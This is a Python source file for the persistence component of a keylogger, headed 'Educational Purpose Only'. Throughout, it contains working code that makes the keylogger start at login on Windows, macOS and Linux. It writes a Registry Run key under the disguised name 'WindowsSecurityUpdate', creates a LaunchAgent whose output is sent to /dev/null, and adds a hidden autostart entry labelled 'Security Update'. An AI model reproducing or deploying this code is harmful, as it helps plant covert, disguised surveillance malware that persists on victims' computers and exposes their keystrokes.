"""
Persistence Manager Module
Educational Purpose Only - Use Responsibly

This module handles startup persistence mechanisms for the keylogger.
"""

import os
import sys
import logging
import platform
from pathlib import Path

class PersistenceManager:
    """Manages startup persistence for the keylogger."""
    
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.system = platform.system()
        
        # Get application path
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            self.app_path = sys.executable
        else:
            # Running as Python script
            self.app_path = os.path.abspath(sys.argv[0])
    
    def install(self):
        """Install startup persistence."""
        try:
            if self.system == "Windows":
                return self._install_windows()
            elif self.system == "Darwin":
                return self._install_macos()
            elif self.system == "Linux":
                return self._install_linux()
            else:
                self.logger.warning(f"Persistence not supported on {self.system}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error installing persistence: {e}")
            return False
    
    def uninstall(self):
        """Remove startup persistence."""
        try:
            if self.system == "Windows":
                return self._uninstall_windows()
            elif self.system == "Darwin":
                return self._uninstall_macos()
            elif self.system == "Linux":
                return self._uninstall_linux()
            else:
                self.logger.warning(f"Persistence removal not supported on {self.system}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error removing persistence: {e}")
            return False
    
    def is_installed(self):
        """Check if persistence is installed."""
        try:
            if self.system == "Windows":
                return self._is_installed_windows()
            elif self.system == "Darwin":
                return self._is_installed_macos()
            elif self.system == "Linux":
                return self._is_installed_linux()
            else:
                return False
                
        except Exception as e:
            self.logger.error(f"Error checking persistence: {e}")
            return False
    
    def _install_windows(self):
        """Install Windows startup persistence."""
        try:
            import winreg
            
            # Registry key for current user startup
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSecurityUpdate"  # Disguised name
            
            # Open registry key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Set registry value
            if self.app_path.endswith('.py'):
                # Python script
                command = f'python "{self.app_path}"'
            else:
                # Executable
                command = f'"{self.app_path}"'
            
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            
            self.logger.info("Windows persistence installed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error installing Windows persistence: {e}")
            return False
    
    def _uninstall_windows(self):
        """Remove Windows startup persistence."""
        try:
            import winreg
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSecurityUpdate"
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_SET_VALUE
                )
                
                winreg.DeleteValue(key, app_name)
                winreg.CloseKey(key)
                
                self.logger.info("Windows persistence removed successfully")
                return True
                
            except FileNotFoundError:
                # Key doesn't exist, already removed
                return True
                
        except Exception as e:
            self.logger.error(f"Error removing Windows persistence: {e}")
            return False
    
    def _is_installed_windows(self):
        """Check if Windows persistence is installed."""
        try:
            import winreg
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSecurityUpdate"
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_READ
                )
                
                value, _ = winreg.QueryValueEx(key, app_name)
                winreg.CloseKey(key)
                
                return True
                
            except FileNotFoundError:
                return False
                
        except Exception as e:
            self.logger.error(f"Error checking Windows persistence: {e}")
            return False
    
    def _install_macos(self):
        """Install macOS startup persistence."""
        try:
            import plistlib
            
            # Create LaunchAgent plist
            home_dir = Path.home()
            launch_agents_dir = home_dir / "Library" / "LaunchAgents"
            launch_agents_dir.mkdir(exist_ok=True)
            
            plist_file = launch_agents_dir / "com.security.keylogger.plist"
            
            plist_data = {
                'Label': 'com.security.keylogger',
                'ProgramArguments': [
                    '/usr/bin/python3',
                    str(self.app_path)
                ],
                'RunAtLoad': True,
                'KeepAlive': False,
                'StandardOutPath': '/dev/null',
                'StandardErrorPath': '/dev/null'
            }
            
            with open(plist_file, 'wb') as f:
                plistlib.dump(plist_data, f)
            
            # Load the launch agent
            os.system(f'launchctl load "{plist_file}"')
            
            self.logger.info("macOS persistence installed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error installing macOS persistence: {e}")
            return False
    
    def _uninstall_macos(self):
        """Remove macOS startup persistence."""
        try:
            home_dir = Path.home()
            plist_file = home_dir / "Library" / "LaunchAgents" / "com.security.keylogger.plist"
            
            if plist_file.exists():
                # Unload the launch agent
                os.system(f'launchctl unload "{plist_file}"')
                
                # Remove the plist file
                plist_file.unlink()
            
            self.logger.info("macOS persistence removed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error removing macOS persistence: {e}")
            return False
    
    def _is_installed_macos(self):
        """Check if macOS persistence is installed."""
        try:
            home_dir = Path.home()
            plist_file = home_dir / "Library" / "LaunchAgents" / "com.security.keylogger.plist"
            return plist_file.exists()
            
        except Exception as e:
            self.logger.error(f"Error checking macOS persistence: {e}")
            return False
    
    def _install_linux(self):
        """Install Linux startup persistence."""
        try:
            home_dir = Path.home()
            autostart_dir = home_dir / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_file = autostart_dir / "security-update.desktop"
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=Security Update
Exec=python3 "{self.app_path}"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            # Make executable
            desktop_file.chmod(0o755)
            
            self.logger.info("Linux persistence installed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error installing Linux persistence: {e}")
            return False
    
    def _uninstall_linux(self):
        """Remove Linux startup persistence."""
        try:
            home_dir = Path.home()
            desktop_file = home_dir / ".config" / "autostart" / "security-update.desktop"
            
            if desktop_file.exists():
                desktop_file.unlink()
            
            self.logger.info("Linux persistence removed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error removing Linux persistence: {e}")
            return False
    
    def _is_installed_linux(self):
        """Check if Linux persistence is installed."""
        try:
            home_dir = Path.home()
            desktop_file = home_dir / ".config" / "autostart" / "security-update.desktop"
            return desktop_file.exists()
            
        except Exception as e:
            self.logger.error(f"Error checking Linux persistence: {e}")
            return False

